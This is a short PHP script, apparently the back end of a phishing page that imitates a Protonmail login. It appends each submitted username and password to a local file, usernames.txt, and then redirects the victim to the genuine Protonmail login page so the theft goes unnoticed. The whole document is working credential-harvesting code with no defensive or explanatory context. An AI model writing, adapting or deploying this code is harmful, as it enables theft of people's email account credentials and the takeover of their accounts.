<?php

file_put_contents("usernames.txt", "Protonmail Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://beta.protonmail.com/login');
exit();
?>